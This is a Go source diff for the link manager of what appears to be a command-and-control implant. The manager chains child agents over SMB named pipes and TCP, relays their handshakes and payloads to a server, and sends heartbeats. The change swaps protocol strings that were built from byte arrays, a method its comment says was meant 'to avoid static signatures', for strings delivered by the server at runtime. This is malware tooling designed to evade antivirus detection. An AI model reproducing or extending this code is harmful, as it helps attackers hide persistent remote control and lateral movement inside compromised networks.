@@ -17,23 +17,63 @@ import (
 	"time"
 )
 
-// Link manager strings (constructed to avoid static signatures)
-var (
-	lmKeyType       = string([]byte{0x74, 0x79, 0x70, 0x65})                       // type
-	lmKeyPayload    = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})     // payload
-	lmTypeData      = string([]byte{0x64, 0x61, 0x74, 0x61})                       // data
-	lmTypeDisconn   = string([]byte{0x64, 0x69, 0x73, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74}) // disconnect
-	lmTypeHandshake = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65})       // handshake
-	lmTypePing      = string([]byte{0x70, 0x69, 0x6e, 0x67})                       // ping
-	lmTypePong      = string([]byte{0x70, 0x6f, 0x6e, 0x67})                       // pong
-	lmStatusActive  = string([]byte{0x61, 0x63, 0x74, 0x69, 0x76, 0x65})           // active
-	lmStatusInact   = string([]byte{0x69, 0x6e, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65}) // inactive
-	lmAuthPrefix    = string([]byte{0x41, 0x55, 0x54, 0x48, 0x3a})                 // AUTH:
-	lmAuthOK        = string([]byte{0x4f, 0x4b})                                   // OK
-	lmFmtLinks      = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x4c, 0x69, 0x6e, 0x6b, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x3a, 0x0a}) // Active Links (%d):\n
-	lmFmtLinkRow    = string([]byte{0x20, 0x20, 0x5b, 0x25, 0x73, 0x5d, 0x20, 0x25, 0x73, 0x20, 0x2d, 0x20, 0x25, 0x73, 0x20, 0x28, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x73, 0x2c, 0x20, 0x6c, 0x61, 0x73, 0x74, 0x20, 0x73, 0x65, 0x65, 0x6e, 0x3a, 0x20, 0x25, 0x73, 0x29, 0x0a}) //   [%s] %s - %s (connected: %s, last seen: %s)\n
-	lmTimeFmt       = string([]byte{0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 15:04:05
+// Template indices for link manager strings (must match server's common.go)
+const (
+	idxLinkKeyType      = 133
+	idxLinkKeyPayload   = 134
+	idxLinkMsgData      = 135
+	idxLinkMsgDisconn   = 136
+	idxLinkMsgHandshake = 137
+	idxLinkMsgPing      = 138
+	idxLinkMsgPong      = 139
+	idxLinkStatusActive = 340
+	idxLinkStatusInact  = 341
+	idxLinkAuthPrefix   = 342
+	idxLinkAuthOK       = 343
+	idxLinkFmtList      = 344
+	idxLinkFmtRow       = 345
+	idxLinkTimeFmt      = 346
 )
+
+// linkManagerTemplate stores the template received from the server
+var linkManagerTemplate []string
+var linkManagerTemplateMu sync.RWMutex
+
+// SetLinkManagerTemplate stores the template for link manager use
+func SetLinkManagerTemplate(templates []string) {
+	linkManagerTemplateMu.Lock()
+	defer linkManagerTemplateMu.Unlock()
+	linkManagerTemplate = templates
+}
+
+// lmTpl retrieves a template string by index
+// Template must be set via SetLinkManagerTemplate before link operations
+func lmTpl(idx int) string {
+	linkManagerTemplateMu.RLock()
+	tpl := linkManagerTemplate
+	linkManagerTemplateMu.RUnlock()
+
+	if tpl != nil && idx < len(tpl) {
+		return tpl[idx]
+	}
+	return ""
+}
+
+// Convenience variables that call lmTpl (for cleaner code)
+func lmKeyType() string       { return lmTpl(idxLinkKeyType) }
+func lmKeyPayload() string    { return lmTpl(idxLinkKeyPayload) }
+func lmTypeData() string      { return lmTpl(idxLinkMsgData) }
+func lmTypeDisconn() string   { return lmTpl(idxLinkMsgDisconn) }
+func lmTypeHandshake() string { return lmTpl(idxLinkMsgHandshake) }
+func lmTypePing() string      { return lmTpl(idxLinkMsgPing) }
+func lmTypePong() string      { return lmTpl(idxLinkMsgPong) }
+func lmStatusActive() string  { return lmTpl(idxLinkStatusActive) }
+func lmStatusInact() string   { return lmTpl(idxLinkStatusInact) }
+func lmAuthPrefix() string    { return lmTpl(idxLinkAuthPrefix) }
+func lmAuthOK() string        { return lmTpl(idxLinkAuthOK) }
+func lmFmtLinks() string      { return lmTpl(idxLinkFmtList) }
+func lmFmtLinkRow() string    { return lmTpl(idxLinkFmtRow) }
+func lmTimeFmt() string       { return lmTpl(idxLinkTimeFmt) }
 
 // Heartbeat configuration
 const (
@@ -206,11 +246,11 @@ func (lm *LinkManager) Link(pipePath string, creds *SMBCredentials) (string, err
 
 	// Parse handshake message
 	var message map[string]string
-	if err := json.Unmarshal(handshakeData, &message); err == nil && message[lmKeyType] == lmTypeHandshake {
+	if err := json.Unmarshal(handshakeData, &message); err == nil && message[lmKeyType()] == lmTypeHandshake() {
 		// Queue handshake for server via "lh" field
 		outbound := &LinkDataOut{
 			RoutingID: routingID,
-			Payload:   message[lmKeyPayload],
+			Payload:   message[lmKeyPayload()],
 		}
 		select {
 		case lm.handshakeData <- outbound:
@@ -378,10 +418,9 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 	}
 
 	// Send the payload over TCP
-	message := map[string]string{
-		lmKeyType:    lmTypeData,
-		lmKeyPayload: payload,
-	}
+	message := map[string]string{}
+	message[lmKeyType()] = lmTypeData()
+	message[lmKeyPayload()] = payload
 
 	data, err := json.Marshal(message)
 	if err != nil {
@@ -502,10 +541,9 @@ func (lm *LinkManager) forwardToSMBAgentAndWait(link *LinkedAgent, payload strin
 	}
 
 	// Create the command message
-	message := map[string]string{
-		lmKeyType:    lmTypeData,
-		lmKeyPayload: payload,
-	}
+	message := map[string]string{}
+	message[lmKeyType()] = lmTypeData()
+	message[lmKeyPayload()] = payload
 
 	data, err := json.Marshal(message)
 	if err != nil {
@@ -529,11 +567,11 @@ func (lm *LinkManager) forwardToSMBAgentAndWait(link *LinkedAgent, payload strin
 
 	// Parse response - could be JSON envelope or raw transformed data
 	var respMsg map[string]string
-	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType] == lmTypeData {
+	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType()] == lmTypeData() {
 		// Legacy JSON envelope format
 		return &LinkDataOut{
 			RoutingID: link.RoutingID,
-			Payload:   respMsg[lmKeyPayload],
+			Payload:   respMsg[lmKeyPayload()],
 		}, nil
 	}
 
@@ -621,10 +659,10 @@ func (lm *LinkManager) forwardToSMBAgentRawAndWait(link *LinkedAgent, rawData []
 
 	// Parse response - could be JSON envelope or raw transformed data
 	var respMsg map[string]string
-	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType] == lmTypeData {
+	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType()] == lmTypeData() {
 		return &LinkDataOut{
 			RoutingID: link.RoutingID,
-			Payload:   respMsg[lmKeyPayload],
+			Payload:   respMsg[lmKeyPayload()],
 		}, nil
 	}
 
@@ -695,22 +733,22 @@ func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
 
 		// Try to parse as legacy JSON format first
 		var message map[string]string
-		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
+		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType()] != "" {
 			// Successfully parsed as JSON with type field - legacy format
-			switch message[lmKeyType] {
-			case lmTypeData:
+			switch message[lmKeyType()] {
+			case lmTypeData():
 				// Build outbound data
 				outbound := &LinkDataOut{
 					RoutingID: link.RoutingID,
-					Payload:   message[lmKeyPayload],
+					Payload:   message[lmKeyPayload()],
 				}
 				lm.deliverOutbound(link, outbound)
 
-			case lmTypeHandshake:
+			case lmTypeHandshake():
 				// Initial handshake from SMB/TCP agent - queue for server via "lh" field
 				outbound := &LinkDataOut{
 					RoutingID: link.RoutingID,
-					Payload:   message[lmKeyPayload],
+					Payload:   message[lmKeyPayload()],
 				}
 				select {
 				case lm.handshakeData <- outbound:
@@ -722,10 +760,10 @@ func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
 				link.AwaitingHandshake = false
 				link.mu.Unlock()
 
-			case lmTypePong:
+			case lmTypePong():
 				// Heartbeat response from child agent - just update LastSeen
 
-			case lmTypeDisconn:
+			case lmTypeDisconn():
 				return
 			}
 		} else {
@@ -852,21 +890,21 @@ func (lm *LinkManager) ListLinks() string {
 		return Succ(S0)
 	}
 
-	result := fmt.Sprintf(lmFmtLinks, len(lm.links))
+	result := fmt.Sprintf(lmFmtLinks(), len(lm.links))
 	for routingID, link := range lm.links {
-		status := lmStatusActive
+		status := lmStatusActive()
 		if !link.IsActive {
-			status = lmStatusInact
+			status = lmStatusInact()
 		}
 		// Show pipe path for SMB, address for TCP
 		displayPath := link.Address
 		if link.LinkType == "smb" {
 			displayPath = link.PipePath
 		}
-		result += fmt.Sprintf(lmFmtLinkRow,
+		result += fmt.Sprintf(lmFmtLinkRow(),
 			routingID, displayPath, status,
-			link.Connected.Format(lmTimeFmt),
-			link.LastSeen.Format(lmTimeFmt))
+			link.Connected.Format(lmTimeFmt()),
+			link.LastSeen.Format(lmTimeFmt()))
 	}
 	return result
 }
@@ -874,7 +912,8 @@ func (lm *LinkManager) ListLinks() string {
 // Helper functions
 
 func sendDisconnectMessage(conn net.Conn) {
-	message := map[string]string{lmKeyType: lmTypeDisconn}
+	message := map[string]string{}
+	message[lmKeyType()] = lmTypeDisconn()
 	data, _ := json.Marshal(message)
 	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
 	writeMessage(conn, data)
@@ -963,9 +1002,8 @@ func (lm *LinkManager) sendPing(link *LinkedAgent) error {
 		return fmt.Errorf(Err(E4))
 	}
 
-	message := map[string]string{
-		lmKeyType: lmTypePing,
-	}
+	message := map[string]string{}
+	message[lmKeyType()] = lmTypePing()
 
 	data, err := json.Marshal(message)
 	if err != nil {
